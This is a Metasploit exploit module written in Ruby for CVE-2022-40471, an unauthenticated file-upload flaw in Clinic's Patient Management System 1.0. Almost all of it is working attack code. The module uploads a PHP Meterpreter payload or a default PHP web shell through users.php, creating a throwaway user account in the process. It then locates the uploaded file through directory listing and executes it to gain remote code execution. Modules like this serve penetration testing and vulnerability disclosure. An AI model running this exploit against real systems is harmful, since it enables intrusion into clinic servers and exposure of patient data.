##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Clinic\'s Patient Management System 1.0 - Unauthenticated RCE',
        'Description' => %q{
          This module exploits an unauthenticated file upload vulnerability in Clinic's
          Patient Management System 1.0. An attacker can upload a PHP web shell and execute
          it by leveraging directory listing enabled on the `/pms/user_images` directory.
        },
        'Author' => [
          'Aaryan Golatkar', # Metasploit Module Developer
          'Oğulcan Hami Gül', # Vulnerability discovery
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Privileged' => false,
        'Targets' => [
          ['Clinic Patient Management System 1.0', {}]
        ],
        'DefaultTarget' => 0,
        'References' => [
          ['EDB', '51779'],
          ['CVE', '2022-40471'],
          ['URL', 'https://www.cve.org/CVERecord?id=CVE-2022-40471'],
          ['URL', 'https://drive.google.com/file/d/1m-wTfOL5gY3huaSEM3YPSf98qIrkl-TW/view']
        ],
        'DisclosureDate' => '2022-10-31',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to the Clinic Patient Management System', '/pms']),
      OptString.new('PHP_PAYLOAD', [false, 'Custom PHP payload to upload', "<?php echo shell_exec($_GET['cmd']); ?>"]),
      OptInt.new('LISTING_DELAY', [true, 'Time to wait before retrieving directory listing (seconds)', 2])
    ])
  end

  def check
    print_status('Checking if target is vulnerable...')

    # Check for /pms/users.php endpoint availability
    print_status('Testing /pms/users.php for upload functionality...')
    res_users = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'users.php'),
      'method' => 'GET'
    })

    if res_users && res_users.code == 200 && res_users.body.include?('<form')
      print_good('/pms/users.php endpoint is accessible!')
    else
      print_error('/pms/users.php endpoint is not accessible.')
      return CheckCode::Safe
    end

    # Check if directory listing is enabled on /pms/user_images
    print_status('Checking for directory listing on /pms/user_images...')
    res_listing = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'user_images/'),
      'method' => 'GET'
    })

    if res_listing && res_listing.code == 200 && res_listing.body.include?('<a href="')
      print_good('Directory listing is enabled on /pms/user_images!')
      return CheckCode::Vulnerable
    else
      print_error('Directory listing is not enabled on /pms/user_images.')
      return CheckCode::Appears
    end
  end

  def upload_shell
    random_user = Rex::Text.rand_text_alphanumeric(8)
    random_password = Rex::Text.rand_text_alphanumeric(12)
    filename = Rex::Text.rand_text_alphanumeric(8) + '.php'

    # Generate the PHP Meterpreter payload
    print_status('Generating PHP Meterpreter payload...')
    payload_content = payload.encoded

    post_data = Rex::MIME::Message.new
    post_data.add_part(random_user, nil, nil, 'form-data; name="display_name"')
    post_data.add_part(random_user, nil, nil, 'form-data; name="user_name"')
    post_data.add_part(random_password, nil, nil, 'form-data; name="password"')
    post_data.add_part(payload_content, 'application/x-php', nil, "form-data; name=\"profile_picture\"; filename=\"#{filename}\"")
    post_data.add_part('', nil, nil, 'form-data; name="save_user"')

    print_status("Uploading PHP Meterpreter payload as #{filename}...")
    print_status("Using random username: #{random_user}")
    print_status("Using random password: #{random_password}")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'users.php'),
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    })

    if res
      print_status("Server response: #{res.code} #{res.message}")
      print_status("Response body: #{res.body[0, 500]}") # Limit to 500 chars
    else
      fail_with(Failure::UnexpectedReply, 'No response received from the server')
    end

    fail_with(Failure::UnexpectedReply, 'Failed to upload PHP payload') unless res && res.code == 302
    print_good('Payload uploaded successfully!')
    filename
  end

  def fetch_uploaded_filename
    print_status('Retrieving directory listing from /pms/user_images...')
    sleep datastore['LISTING_DELAY'] # Allow time for the file to be saved on the server

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'user_images/'),
      'method' => 'GET'
    })

    fail_with(Failure::UnexpectedReply, 'Failed to retrieve directory listing') unless res && res.code == 200

    # Search for the uploaded filename
    matches = res.body.scan(/href="(\d+#{Regexp.escape(@uploaded_filename)})"/)
    if matches.empty?
      fail_with(Failure::NotFound, 'Uploaded file not found in directory listing')
    end

    matches.first.first
  end

  def execute_shell(uploaded_file)
    shell_url = normalize_uri(target_uri.path, 'user_images', uploaded_file)
    print_status("Executing the uploaded shell at #{shell_url}...")
    send_request_cgi({
      'uri' => shell_url,
      'method' => 'GET'
      # 'vars_get' => { 'cmd' => 'id' }
    })

    # if res && res.code == 200
    #   print_good("Command executed successfully! Output:\n#{res.body}")
    # else
    #   fail_with(Failure::UnexpectedReply, 'Failed to execute the uploaded shell')
    # end
  end

  def exploit
    @uploaded_filename = upload_shell
    final_filename = fetch_uploaded_filename
    execute_shell(final_filename)
  end
end
